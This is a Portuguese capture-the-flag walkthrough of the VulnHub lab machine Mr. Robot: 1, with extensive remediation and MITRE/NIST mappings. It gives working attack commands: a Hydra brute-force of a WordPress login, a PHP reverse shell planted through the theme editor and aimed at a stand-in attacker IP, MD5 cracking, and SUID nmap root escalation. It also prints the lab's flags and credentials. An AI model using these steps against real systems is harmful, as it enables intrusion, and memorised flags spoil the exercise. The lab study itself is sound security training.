# Mr. Robot: 1 — Hello, Friend

Olá, amigo. Olá, amigo? Que chato. Talvez eu devesse te dar um nome. Que tal fsociety?

Esse é o cara, mano. Mr. Robot: 1 é o box que transformou inúmeras pessoas em pentesters. Inspirado na série de TV da USA Network, coloca você no lugar de Elliot Alderson e pergunta: você consegue hackear as três chaves? Sem dúvida alguma, este é um dos VMs CTF mais icônicos já construídos. O brute-force no WordPress, a wordlist fsocity.dic, a senha toda em minúsculas do Elliot, o hash MD5 do robot, o shell interativo nmap com SUID — cada passo parece uma cena da série. Lenda absoluta, fr fr.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Mr. Robot: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/mr-robot-1,151/ |
| **Técnicas** | Enumeração robots.txt, deduplicação fsocity.dic, enumeração de usuários WPScan, brute-force WordPress com Hydra, PHP RCE via Editor de Tema WordPress, quebra de hash MD5, escalada via shell interativo SUID nmap |
| **CVEs** | CWE-521 (Requisitos Fracos de Senha — senha fraca de elliot no WordPress), CWE-732 (Atribuição Incorreta de Permissão — SUID nmap), CWE-916 (Uso de Hash de Senha com Esforço Computacional Insuficiente — MD5 para senha do robot) |
| **Grupos APT** | FIN7: alveja rotineiramente painéis admin WordPress com credential stuffing e brute-force como acesso inicial; APT41: explora editores de tema/plugin de CMS para implantação de web shell em operações de acesso inicial |

---

## Resumo do Ataque

```
netdiscover → nmap → porta 80 (HTTP/WordPress) + 443 (HTTPS) + 22 (fechada)
  → navegar porta 80 → terminal interativo temático Mr. Robot
  → robots.txt → key-1-of-3.txt + fsocity.dic
  → Chave 1: 073403c8a58a1f80d943455fb30724b9
  → sort -u fsocity.dic → 11.451 entradas únicas (de 858.160)
  → wpscan --enumerate u → usuário: elliot
  → hydra -l elliot -P fsocity_uniq.dic → elliot:ER28-0652
  → login wp-admin → Aparência → Editor → 404.php → PHP reverse shell
  → nc -lvnp 4444 → shell como daemon
  → /home/robot/password.raw-md5 → robot:c3fcd3d76192e4007dfb496cca67e13b
  → hashcat -m 0 → abcdefghijklmnopqrstuvwxyz
  → python pty → su robot → Chave 2: 822c73956184f694993bebb3eb32f0b9
  → buscar SUID → /usr/local/bin/nmap (versão 3.81)
  → nmap --interactive → !sh → uid=0(root)
  → Chave 3: 04787ddef27c3dee1ee161b21670b4e4
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração web: descobrir instalação WordPress e robots.txt
3. Baixar wordlist fsocity.dic do robots.txt; capturar Chave 1
4. Deduplicar wordlist para reduzir tempo de brute-force
5. Enumerar usuários WordPress com WPScan
6. Brute-force da senha de elliot no WordPress com Hydra
7. Fazer upload de PHP reverse shell via Editor de Tema WordPress
8. Estabilizar shell; ler hash MD5 da senha do robot; capturar Chave 2
9. Escalada de privilégios via SUID nmap --interactive; capturar Chave 3

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Alvo: 192.168.56.X

nmap -sV -sC -p- 192.168.56.X
```

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

SSH está fechada. HTTP e HTTPS rodam no Apache. Ambos servem a mesma instalação WordPress. O terminal interativo temático Mr. Robot na página inicial é puramente cosmético.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e robots.txt

Navegue para `http://IP_ALVO`. O terminal fake interativo deixa você executar comandos como `prepare`, `fsociety`, `inform`, `question`, `wakeup` e `join`. Todos cosméticos. Nenhum leva a algo útil.

Verifique o robots.txt:

```bash
curl http://IP_ALVO/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Ambos os arquivos são diretamente acessíveis. Isso é intencional — a máquina ensina enumeração de robots.txt como passo fundamental.

**Chave 1 capturada:**

```bash
curl http://IP_ALVO/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9
```

**Nota real:** robots.txt é um documento público voltado para crawlers de mecanismos de busca. Listar caminhos sensíveis nele na verdade os anuncia para atacantes. Isso é uma descoberta consistente de má configuração em avaliações de aplicações web.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Baixar e Deduplicar a Wordlist

```bash
wget http://IP_ALVO/fsocity.dic
wc -l fsocity.dic
# 858.160 linhas — massivo, principalmente duplicatas
```

A deduplicação é crítica aqui. Rodar Hydra contra 858.160 entradas levaria horas. Após a deduplicação:

```bash
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# 11.451 entradas únicas
```

Uma redução de 98,7%. O brute-force agora leva minutos em vez de dias. Caramba, top demais!

**Por que isso importa:** Wordlists customizadas derivadas do contexto do alvo superam dramaticamente listas genéricas. A fsocity.dic é uma wordlist específica de contexto derivada do universo de Mr. Robot. Em engajamentos reais, gerar uma wordlist CUPP do perfil de mídia social do alvo é equivalente.

**MITRE ATT&CK:** T1110.003 — Força Bruta: Pulverização de Senhas (otimizado)

---

## Passo 4 — Enumerar Usuários WordPress

```bash
wpscan --url http://IP_ALVO --enumerate u
# Alternativa: wpscan --url http://IP_ALVO -e u --no-update
```

WPScan identifica um usuário WordPress válido: **elliot**

A enumeração de usuários WordPress funciona porque a plataforma retorna respostas HTTP diferentes para nomes de usuário válidos vs. inválidos na página de login. Por padrão, WordPress vaza nomes de usuário livremente.

**MITRE ATT&CK:** T1087.001 — Descoberta de Conta: Conta Local

---

## Passo 5 — Brute-Force do Login WordPress

```bash
hydra -l elliot -P fsocity_uniq.dic IP_ALVO http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
  -t 30 -v
```

**Alternativa com WPScan:**

```bash
wpscan --url http://IP_ALVO -U elliot -P fsocity_uniq.dic
```

Credencial encontrada: **elliot : ER28-0652**

`ER28-0652` é o ID de funcionário de Elliot Alderson na série. A senha é temática da narrativa do VM. Em engajamentos reais, senhas temáticas derivadas da cultura da empresa, produtos ou informações públicas são extremamente comuns.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 6 — PHP Reverse Shell via Editor de Tema WordPress

Faça login em `http://IP_ALVO/wp-admin` com `elliot:ER28-0652`.

Navegue para: **Aparência → Editor → Modelo 404 (404.php)**

Substitua todo o conteúdo do 404.php pelo PHP reverse shell do PentestMonkey. Configure o IP e porta do atacante:

```php
$ip = 'IP_ATACANTE';
$port = 4444;
```

Inicie o listener netcat:

```bash
nc -lvnp 4444
```

Dispare o shell visitando uma página inexistente para invocar o modelo 404:

```bash
curl http://IP_ALVO/wp-content/themes/twentyfifteen/404.php
# ou: curl http://IP_ALVO/pagina-inexistente-12345
```

Reverse shell recebido como `daemon`. Bora rapaziada!

**Por que funciona:** Usuários admin do WordPress podem editar arquivos PHP de temas diretamente pelo painel. Editar 404.php e visitar qualquer URL inexistente dispara o modelo modificado. Técnica bem conhecida de pós-exploração WordPress documentada desde 2012.

**MITRE ATT&CK:** T1505.001 — Componente de Software de Servidor; T1059.004 — Interpretador de Comando e Script: Unix Shell

---

## Passo 7 — Estabilização de Shell e Chave 2

Estabilize o shell raw netcat:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Pressione Enter duas vezes
```

Enumere o diretório home:

```bash
ls -la /home/robot/
# key-2-of-3.txt  password.raw-md5
```

O arquivo de chave não é legível como `daemon`. O arquivo de hash MD5 tem permissão de leitura para todos:

```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Quebre o hash MD5:

```bash
# Na máquina atacante:
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
# Resultado: abcdefghijklmnopqrstuvwxyz
```

```bash
# De volta ao shell da vítima:
su robot
# Senha: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
# 822c73956184f694993bebb3eb32f0b9
```

**Por que MD5 é quebrado para senhas:** MD5 é um hash rápido projetado para integridade de dados, não armazenamento de senhas. Uma GPU pode testar bilhões de hashes MD5 por segundo. Use bcrypt, scrypt ou Argon2 para hashing de senhas.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 8 — Escalada de Privilégios via SUID nmap

Busque binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

A saída inclui `/usr/local/bin/nmap`. Verifique a versão:

```bash
nmap --version
# nmap versão 3.81
```

Versões nmap de 2.02 a 5.21 suportam modo `--interactive`, que spawna um shell. Quando nmap tem o bit SUID definido e é de propriedade do root, o shell spawned herda privilégios root.

```bash
nmap --interactive
nmap> !sh

id
# uid=1000(robot) euid=0(root)

cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

Root alcançado. Olá, amigo. (❍ᴥ❍ʋ)

**Nota real:** GTFOBins (gtfobins.github.io) cataloga técnicas de escalada de privilégios para mais de 200 binários Unix. Qualquer binário com o bit SUID que pode executar código arbitrário ou spawnar um shell torna-se um vetor trivial de root. Sempre verifique GTFOBins para cada binário SUID encontrado.

**MITRE ATT&CK:** T1548.001 — Abuso de Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Chave 1 | `073403c8a58a1f80d943455fb30724b9` | /key-1-of-3.txt (via robots.txt) | Objetivo 1 |
| Credencial | elliot:ER28-0652 | Brute-force Hydra contra /wp-login.php | Login admin WordPress |
| Hash MD5 | c3fcd3d76192e4007dfb496cca67e13b | /home/robot/password.raw-md5 | Quebra de hash |
| Credencial | robot:abcdefghijklmnopqrstuvwxyz | MD5 quebrado via hashcat | su para usuário robot |
| Chave 2 | `822c73956184f694993bebb3eb32f0b9` | /home/robot/key-2-of-3.txt | Objetivo 2 |
| Chave 3 | `04787ddef27c3dee1ee161b21670b4e4` | /root/key-3-of-3.txt | Objetivo 3 |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | robots.txt divulga arquivos sensíveis | robots.txt é público; listar um caminho nele é anunciá-lo para atacantes | Nunca coloque caminhos sensíveis no robots.txt; use controles de acesso do lado do servidor |
| 2 | Enumeração de usuários WordPress (parâmetro autor, erros de login) | WordPress expõe nomes de usuário por padrão; combinado com wordlist, permite brute-force direcionado | Proteja páginas de autor; retorne 404 para nomes de usuário inválidos na página de login; instale plugin Stop User Enumeration |
| 3 | Deduplicação de wordlist reduz tempo de brute-force em 98,7% | Wordlists customizadas direcionadas superam massivamente as genéricas; qualidade supera quantidade | Gere wordlists específicas de contexto; deduplique antes de rodar brute-force |
| 4 | Editor de Tema WordPress permite execução arbitrária de PHP | Qualquer admin WordPress pode implantar código PHP malicioso via Editor de Tema sem fazer upload de arquivo | Desabilite o Editor de Tema: `define('DISALLOW_FILE_EDIT', true)` no wp-config.php |
| 5 | MD5 não é um hash de senha | MD5 não tem custo computacional; GPUs modernas quebram hashes MD5 a bilhões por segundo | Use bcrypt (fator de custo 12+), scrypt ou Argon2 para armazenamento de senhas |
| 6 | SUID nmap --interactive spawna shell como root | Qualquer binário SUID que pode executar código arbitrário ou spawnar shell é equivalente a um backdoor root | Audite todos os binários SUID; remova SUID de ferramentas não essenciais; nmap nunca precisa de SUID em produção |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios (robots.txt) | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso a Credenciais | Acesso a Credenciais | Descoberta de Conta: Conta Local (WPScan) | T1087.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (admin WP) | T1190 |
| Execução | Execução | Interpretador de Comando e Script: Unix Shell | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (arquivo hash MD5) | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha (hashcat MD5) | T1110.002 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Setuid (SUID nmap) | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova caminhos sensíveis do robots.txt**: nunca liste arquivos que não quer acessados; use controles de acesso do lado do servidor
2. **Desabilite enumeração de usuários WordPress**: adicione proteção `wp_redirect()` em páginas de autor; retorne 404 para nomes de usuário inválidos na página de login; instale o plugin Stop User Enumeration
3. **Desabilite o Editor de Tema/Plugin WordPress**: adicione `define('DISALLOW_FILE_EDIT', true);` ao wp-config.php; isso previne execução de código PHP a nível de admin pelo painel
4. **Aplique senhas fortes no WordPress**: use os requisitos de força de senha embutidos no WordPress; desabilite XML-RPC se não necessário: `add_filter('xmlrpc_enabled', '__return_false')`
5. **Substitua MD5 por bcrypt para hashing de senhas**: WordPress nativamente usa phpass (baseado em bcrypt); o problema aqui foi armazenar um MD5 bruto fora do sistema de senhas do WordPress
6. **Remova SUID do nmap**: `chmod u-s /usr/local/bin/nmap`; use capabilities em vez disso: `setcap cap_net_raw+ep /usr/local/bin/nmap`
7. **Limite tentativas de login no WordPress**: implemente regras fail2ban ou o plugin Limit Login Attempts Reloaded para bloquear ataques de brute-force

### Contramedidas MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação: desabilite Editor de Tema; desabilite XML-RPC; desabilite enumeração de usuários
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional: remova SUID do nmap; use capabilities em vez disso
- **D3-NTF** — Filtragem de Tráfego de Rede: limite taxa de requisições wp-login.php via WAF ou nginx limit_req

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar instalações WordPress; catalogar binários SUID; documentar caminhos expostos em robots.txt |
| Proteger | Controle de Acesso | Desabilitar Editor de Tema; aplicar política de senha forte; remover SUID nmap |
| Proteger | Segurança de Dados | Substituir MD5 bruto por bcrypt para todo armazenamento de senhas |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas de brute-force em wp-login.php; alertar sobre modificações de arquivo no Editor de Tema |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais admin WordPress; remover temas comprometidos |
| Recuperar | Planejamento de Recuperação | Restaurar WordPress de backup limpo; auditar todas as contas admin e plugins instalados |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-7 | Tentativas de Logon Sem Sucesso | Limitar taxa e bloquear após logins WordPress falhados repetidos |
| AC-6 | Menor Privilégio | Remover SUID nmap; restringir acesso ao Editor de Tema |
| IA-5(1) | Gerenciamento de Autenticador: Políticas de Senha | Aplicar comprimento e complexidade mínimos de senha no WordPress |
| IA-7 | Autenticação por Módulo Criptográfico | Substituir MD5 por bcrypt/Argon2 para armazenamento de senhas |
| CM-7 | Funcionalidade Mínima | Desabilitar XML-RPC; desabilitar Editor de Tema; remover artefatos de desenvolvimento |
| SC-28 | Proteção de Informações em Repouso | Não armazenar hashes de senhas em arquivos legíveis por todos |

### CISA KEV

Exploração WordPress via execução de código do painel admin (CVE-2019-8942, CVE-2019-8943 e outros) aparece no catálogo CISA KEV. CISA AA22-074A nota que atores de ameaça frequentemente alvejam credenciais admin WordPress via brute-force e credential stuffing como ataque de primeiro estágio. Organizações rodando WordPress devem implementar autenticação multifator no wp-admin e limitar tentativas de login como prioridades imediatas.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade (fortalecimento WordPress) | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios (remover SUID nmap; desabilitar Editor de Tema) | MIL3 |
| Gerenciamento de Ativo, Mudança e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |

---

## Considerações Finais

Mr. Robot: 1 é um artefato cultural tanto quanto um CTF. Ensina disciplina de enumeração (robots.txt, enumeração de usuários, otimização de wordlist), ataques de autenticação (brute-force com wordlist direcionada), exploração web (Editor de Tema como superfície de execução de código), quebra de credenciais (MD5) e escalada SUID — tudo envolto em uma narrativa que faz cada passo parecer uma cena da série.

A lição de deduplicação da fsocity.dic é genuinamente importante: 858.160 entradas reduzidas para 11.451 removendo duplicatas. Isso é o tipo de otimização que transforma um brute-force de 12 horas em um de 3 minutos. É um detalhe que importa em engajamentos reais.

Este é o box que definiu uma geração de jogadores CTF. Se você não rodou ainda, precisa rodar. Se já rodou, sabe exatamente por que ganhou status lendário.

Olá, amigo. gg.

Thanks guys!! (❍ᴥ❍ʋ)
